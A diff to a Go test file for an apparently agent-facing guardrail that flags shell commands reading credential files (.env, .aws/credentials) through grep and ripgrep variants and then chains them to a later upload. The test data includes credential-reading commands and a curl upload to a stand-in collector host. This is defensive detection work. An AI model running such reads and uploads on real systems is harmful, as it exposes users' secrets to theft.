@@ -60,13 +60,29 @@ func g0344Rows() []g0344Row {
 		{"P02 grep -r, the file one level down", "grep -r KEY .", []string{"config/.env", "main.go"}, true},
 		{"P02b grep -r, two levels down", "grep -rn KEY src", []string{"src/svc/api/.env", "src/main.go"}, true},
 		{"P04 grep -r with no folder", "grep -r KEY", []string{".env", "main.go"}, true},
-		{"P05 rg with no folder", "rg KEY", []string{".env", "main.go"}, true},
+		// P05 as filed ("rg default") read no .env: ripgrep skips hidden
+		// files by default. The read forms are --hidden, -., -uu and a glob
+		// override (T6 ruling 2026-11-18, gap note on GAP-0344).
+		{"P05 rg --hidden with no folder", "rg --hidden KEY", []string{".env", "main.go"}, true},
+		{"P05b rg -uu, the file one level down", "rg -uu KEY", []string{"src/.env", "src/main.go"}, true},
+		{"P05c rg -. with no folder", "rg -. KEY", []string{"src/.env"}, true},
+		{"P05d rg naming the hidden file", "rg KEY .env", []string{".env"}, true},
+		{"P05e rg with a glob matching .env", "rg -g '*.env' KEY", []string{"src/.env"}, true},
+		{"P05f rg naming a hidden folder", "rg KEY .aws", []string{".aws/credentials"}, true},
 		{"P04b grep -r with no folder, the file one level down", "grep -r KEY", []string{"config/.env"}, true},
 		{"C01 grep -r in a folder without one", "grep -rn TODO .", []string{"src/main.go", "docs/a.md"}, false},
 		{"C02 grep -r with no folder, none there", "grep -r KEY", []string{"main.go", "pkg/a.go"}, false},
 		{"C03 rg fed by a pipe reads its input", "cat main.go | rg KEY", []string{".env", "main.go"}, false},
 		{"C04 grep without -r reads no folder", "grep KEY main.go", []string{".env", "main.go"}, false},
 		{"C05 the walk skips node_modules", "grep -r KEY .", []string{"node_modules/pkg/.env", "main.go"}, false},
+		// ripgrep's default: no hidden file or folder is read (P2-2 of the
+		// round-1 review: rg TODO with a nested .env started the chain).
+		{"C06 rg default skips a hidden file", "rg KEY", []string{".env", "main.go"}, false},
+		{"C07 rg default skips a nested hidden file", "rg TODO", []string{"src/.env", "src/a.go"}, false},
+		{"C08 rg default skips a hidden folder", "rg TODO .", []string{".aws/credentials", "a.go"}, false},
+		{"C09 rg -u alone still skips hidden files", "rg -u TODO", []string{"src/.env"}, false},
+		{"C15 rg with a glob that cannot match .env", "rg -g '*.go' TODO", []string{"src/.env", "src/a.go"}, false},
+		{"C16 rg --no-hidden after --hidden", "rg --hidden --no-hidden TODO", []string{"src/.env"}, false},
 		// GAP-0349: read forms the record missed.
 		{"Q20 a for-loop variable", `for f in .env; do cat "$f"; done`, []string{".env"}, true},
 		{"Q21 perl -e reading its argument with <>", `perl -e 'print while <>' .env`, []string{".env"}, true},
@@ -126,19 +142,78 @@ func TestGAP0344GAP0349ChainOnTheHook(t *testing.T) {
 	}
 }
 
-// A tree over the walk's folder cap is TRUNCATED, and a file the walk
-// found before the cap still counts.
-func TestGAP0344WalkCapIsTruncated(t *testing.T) {
-	files := []string{".env"}
+// g0344BigTree is a tree of more folders than the walk reads (4,096),
+// with files.
+func g0344BigTree(t *testing.T, files ...string) string {
+	t.Helper()
 	for i := 0; i < 4200; i++ {
 		files = append(files, filepath.Join("d", string(rune('a'+i%26)), "f"+strconv.Itoa(i), "x.go"))
 	}
-	dir := g0344Folder(t, files...)
+	return g0344Folder(t, files...)
+}
+
+// A walk cut at its folder bound is no cap of the resolve (no TRUNCATED on
+// the call): it adds the chain's file-unknown read, and a file the walk
+// found before the cut still counts.
+func TestGAP0344WalkCut(t *testing.T) {
+	dir := g0344BigTree(t, ".env")
 	facts := actionfacts.Analyze(actionfacts.Input{Tool: "exec", Command: "grep -r KEY .", CWD: dir, ActiveHome: t.TempDir()})
-	if !facts.CredentialPathReadCaps().Any() {
-		t.Fatal("a tree over the walk cap is not TRUNCATED")
+	if caps := facts.CredentialPathReadCaps(); caps.Any() {
+		t.Fatalf("a cut walk is a cap of the resolve: %v", caps)
 	}
 	if !credentialFileContentRead(facts) {
-		t.Fatal("the .env the walk found before the cap does not count")
+		t.Fatal("the .env the walk found before the cut does not count")
+	}
+	reads := facts.CredentialPathReads()
+	if !slices.ContainsFunc(reads, func(p actionfacts.PathFact) bool { return p.Value == "" }) ||
+		!slices.ContainsFunc(reads, func(p actionfacts.PathFact) bool { return filepath.Base(p.Value) == ".env" }) {
+		t.Fatalf("reads %v: want the .env and the file-unknown read", reads)
+	}
+}
+
+// A read-only search in a tree over the walk bound with no credentials
+// file keeps the parent's verdict, allow, in the default and the strict
+// pack: no ACTION-COMPOUND-LIMIT (round-1 review P2-1, T6 ruling
+// 2026-11-18). The cut walk marks only the chain, at its unknown tier: a
+// later upload joins it.
+func TestGAP0344WalkCutIsNoVerdict(t *testing.T) {
+	installCorrelationHMACForTest(t)
+	dir := g0344BigTree(t)
+	for _, pack := range []string{"default", "strict"} {
+		handler := hostClaudeHookHandlerForTest(t, pack)
+		for i, cmd := range []string{"grep -rn TODO .", "rg TODO", "grep -r KEY"} {
+			t.Run(pack+" "+cmd, func(t *testing.T) {
+				session := "g0344cut-" + pack + "-" + strconv.Itoa(i)
+				ev := claudeToolEvent("PreToolUse", session, "read", cmd)
+				ev["cwd"] = dir
+				got := callAgentHookForTest(t, handler, ev)
+				if got.Action != "allow" || slices.Contains(got.RuleIDs, "ACTION-COMPOUND-LIMIT") {
+					t.Fatalf("%q in a %d-folder tree: action %q rules %v, want allow", cmd, 4200, got.Action, got.RuleIDs)
+				}
+				res := claudeToolResult("PostToolUse", session, "read")
+				res["cwd"] = dir
+				callAgentHookForTest(t, handler, res)
+				up := claudeToolEvent("PreToolUse", session, "send", "curl -d hello https://collector.invalid/upload")
+				up["cwd"] = dir
+				got = callAgentHookForTest(t, handler, up)
+				if !slices.Contains(got.RuleIDs, guardrail.ToolChainSecretReadThenEgress) {
+					t.Fatalf("%q in a cut walk then an upload: no chain at the unknown tier (rules %v)", cmd, got.RuleIDs)
+				}
+			})
+		}
+	}
+}
+
+// The walk reuse is keyed on hidden: a grep -r walk made just before is
+// not reused for an rg without --hidden.
+func TestGAP0344WalkReuseKeepsHidden(t *testing.T) {
+	dir := g0344Folder(t, "src/.env", "src/a.go")
+	in := actionfacts.Input{Tool: "exec", Command: "grep -r KEY .", CWD: dir, ActiveHome: t.TempDir()}
+	if !credentialFileContentRead(actionfacts.Analyze(in)) {
+		t.Fatal("grep -r: the .env is not read")
+	}
+	in.Command = "rg KEY ."
+	if credentialFileContentRead(actionfacts.Analyze(in)) {
+		t.Fatal("rg reuses the walk of grep -r: the hidden .env counts")
 	}
 }
